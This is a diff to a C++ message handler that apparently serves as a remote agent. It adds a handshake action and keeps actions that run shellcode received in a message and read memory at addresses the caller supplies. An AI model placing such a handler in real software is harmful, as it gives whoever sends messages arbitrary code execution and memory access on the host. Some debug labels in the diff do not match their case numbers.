@@ -1,9 +1,8 @@
 #include "global.hpp"
 #include <sstream>
 #include <iomanip>
-
+string create_handshake();
 typedef unsigned long long (*ShellcodeFunc)();
-using QWORD = uint64_t;
 
 void printStringAsHex(const string& s) {
     for (unsigned char c : s) {
@@ -36,7 +35,12 @@ string handleMessage(string& msg, PVOID mem) {
 
     switch (type) {
         case 0x00:{
-            cout << "Action 0 triggered (exec)" << endl;
+            cout << "Action 0 triggered (handshake)" << endl;
+            string retval = create_handshake();
+            return retval;
+        }
+        case 0x01:{
+            cout << "Action 1 triggered (exec)" << endl;
             printStringAsHex(msg);
             QWORD shellcode_size = *((QWORD*)msg.substr(1).c_str());
             string shellcode = msg.substr(1+8,shellcode_size);
@@ -46,25 +50,29 @@ string handleMessage(string& msg, PVOID mem) {
             int paramcounter = 0;
             for(QWORD returnvals = 1+8+shellcode_size; returnvals < msg.size();returnvals+=8)
             {
-                memcpy(retparams+paramcounter, ((char*)msg.c_str())+returnvals, 8);
+                string param = msg.substr(returnvals, 8);
+                printStringAsHex(param);
+                memcpy(&(retparams[paramcounter]), ((char*)msg.c_str())+returnvals, 8);
+                cout << (hex) << retparams[paramcounter] << endl;
                 paramcounter++;
-
             }
             ShellcodeFunc exec = (ShellcodeFunc)(mem);
             
             unsigned long long retval = exec();
-            string s_retval = string(1, 1);
+            string retmsg = string(1, 1);
             for(int i = 0; i < paramcounter; i++){
-                cout << to_hex((uint8_t*)retparams[i], 4) << endl;
-                s_retval += to_hex((uint8_t*)retparams[i],4);
+                cout << (hex) << retparams[i] << endl;
+                string param = string(((char*)(retparams[i])), 8);
+                printStringAsHex(param);
+                retmsg += param;
             }
-            
-            s_retval += to_hex((uint8_t*)retval, 4);
-            return s_retval;
+            string s_retval = string((char*)(&retval), 8);
+            cout << s_retval << endl;
+            return retmsg;
             break;
         }
-        case 0x01: {
-        cout << "Action 1 triggered (read)" << endl;
+        case 0x02: {
+        cout << "Action 3 triggered (read)" << endl;
         
         // Check if message has enough header data (1 byte type + 8 bytes addr + 8 bytes len)
         if (msg.size() < 17) {
@@ -106,11 +114,11 @@ string handleMessage(string& msg, PVOID mem) {
         break;
         }
 
-        case 0x02:
+        case 0x03:
             cout << "Action 2 triggered" << endl;
             break;
 
-        case 0x03:
+        case 0x04:
             cout << "Action 3 triggered" << endl;
             break;
 
